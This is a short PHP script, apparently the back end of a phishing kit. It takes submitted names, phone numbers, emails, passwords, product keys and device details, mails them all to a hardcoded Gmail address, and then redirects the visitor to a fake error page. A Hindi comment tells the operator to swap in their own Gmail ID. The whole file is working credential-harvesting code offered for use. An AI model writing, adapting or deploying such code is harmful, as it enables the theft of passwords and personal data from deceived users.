<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $name     = $_POST['name'] ?? '';
    $country  = $_POST['country'] ?? '';
    $mobile   = $_POST['mobile'] ?? '';
    $email    = $_POST['email'] ?? '';
    $pass     = $_POST['pass'] ?? '';
    $key      = $_POST['key_field'] ?? '';
    $ip       = $_POST['ip'] ?? '';
    $os       = $_POST['os'] ?? '';
    $browser  = $_POST['browser'] ?? '';

    $to = "visit.rahul0036@gmail.com";  // ⬅️ Apna Gmail ID yaha daalein
    $subject = "New Form Submission - Login";
    $message = "
Full Name: $name
Country: $country
Mobile: $mobile
Email: $email
Password: $pass
Product Key: $key
IP Address: $ip
Operating System: $os
Browser: $browser
";

    $headers = "From: noreply@yourdomain.com";

    if (mail($to, $subject, $message, $headers)) {
        header("Location: log-err.html");
        exit;
    } else {
        echo "Mail failed to send. Please check server.";
    }
} else {
    echo "Invalid request method.";
}
?>
